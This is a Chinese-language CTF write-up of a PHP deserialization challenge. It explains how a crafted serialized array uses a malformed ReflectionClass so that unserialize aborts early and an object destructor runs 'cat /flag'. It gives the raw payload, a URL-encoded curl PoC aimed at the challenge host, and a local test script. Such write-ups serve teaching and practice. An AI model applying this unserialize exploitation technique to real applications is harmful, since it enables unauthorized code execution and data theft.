# 题目复现

给出的源码（核心逻辑）：

```
highlight_file(__FILE__);
// ……（中文注释无关）
class test {
    function __destruct() {
        echo 'success!!';
        system("cat /flag");
    }
}
if (isset($_REQUEST['input'])) {
    $a = unserialize($_REQUEST['input']);
    throw new Exception('lose');
}
```

访问示例：`http://101.43.200.131:32871/?input=...`

# 漏洞点与利用思路

- 目标：想办法**触发 ******`**test::__destruct()**`，这样就会 `cat /flag`。
    
- 难点：`unserialize()` 后**立即** `throw new Exception('lose')`，未捕获异常通常会直接终止脚本，使得我们**来不及**看到析构输出。
    
- 关键突破：让**`unserialize()` 自己在解析过程中就抛异常**，这样：
    
    1. 让它**先**成功构造一个 `test` 对象（可放在数组第 0 个元素）；
        
    2. 解析数组第 1 个元素时**抛异常**，`unserialize()` 被打断；
        
    3. 栈回退/清理本地变量时，第 0 个 `test` 对象**引用计数归零** ➜ 触发 `__destruct()` ➜ 打印 flag；
        
    4. 由于异常已在 `unserialize()` 内部抛出，代码中的 `throw new Exception('lose')` 根本执行不到。
        

# 成功利用的 Payload

利用 `ReflectionClass` 在反序列化时的严格校验：它期望属性 `name` 为**字符串合法类名**；我们喂一个**错误类型**（如整型），在恢复阶段会抛异常并中断 `unserialize()`。

原始 payload（未编码）：

```
a:2:{i:0;O:4:"test":0:{}i:1;O:16:"ReflectionClass":1:{s:4:"name";i:1;}}
```

说明：

- `a:2:{ ... }` 是一个长度为 2 的数组；
    
- `i:0;O:4:"test":0:{}`：第 0 个元素是 `test` 对象（无属性），**先被成功构造**；
    
- `i:1;O:16:"ReflectionClass":1:{s:4:"name";i:1;}`：第 1 个元素是 `ReflectionClass`，其 `name` 字段被我们填成整型 `1`，在反序列化校验时抛异常；
    

URL 编码后 PoC（直接打）：

```
curl 'http://101.43.200.131:32871/?input=a%3A2%3A%7Bi%3A0%3BO%3A4%3A%22test%22%3A0%3A%7B%7Di%3A1%3BO%3A16%3A%22ReflectionClass%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bi%3A1%3B%7D%7D'
```

**成功现象**：返回体里出现

```
success!!
<flag内容>
```

# 触发时序（为什么会析构）

简化调用链（逻辑）：

1. 进入 `if (isset($_REQUEST['input']))`；
    
2. 执行 `$a = unserialize($_REQUEST['input']);`
    
    - 先构造数组第 0 个元素的 `test` 对象（RC=1，绑定在 `$a[0]` 的临时结构里）；
        
    - 处理第 1 个元素 `ReflectionClass` 时因非法 `name` 抛异常；
        
3. 异常导致 `unserialize()` 失败并**回退栈帧**，临时结构被销毁，`test` 对象**失去所有引用**；
    
4. 引用计数归零 ➜ PHP 垃圾回收调用 `test::__destruct()`，打印 `success!!` 和 `/flag`；
    
5. 接着异常继续向上冒泡（若未捕获会显示 Fatal），但**flag 已经打印**。
    

> 注：在多数 PHP 版本中，`unserialize()` 阶段的异常清理会触发已构造对象的析构；而“先 unserialize 后手动 `throw`”在某些环境下可能**不触发析构**，这是之前你碰到只见 Fatal 的原因。

# 失败与对比

- 单对象：`O:4:"test":0:{}` ➜ 不能，因为后面紧接着的 `throw new Exception('lose')` 可能导致无输出。
    
- “先 test 后 Exception 对象”（方案 A）：`Exception` 本身的反序列化行为在不同版本上差异较大，有时不会抛、只是致命/告警，不稳定。
    
- `ReflectionClass` 的好处是**校验严格且稳定**，给错类型基本必抛，这就是方案 B 命中的原因。
    

# 本地复现脚本（可选）

```
<?php
class test {
    function __destruct() {
        echo "success!!\n";
        // system("cat /flag");
    }
}

$payload = 'a:2:{i:0;O:4:"test":0:{}i:1;O:16:"ReflectionClass":1:{s:4:"name";i:1;}}';
try {
    $a = unserialize($payload);
    throw new Exception('lose');  // 实际上执行不到
} catch (Throwable $e) {
    // 在真实题目里没 try/catch，这里只是为了看顺序
    // 你会在这里之前就看到 "success!!"
}
```

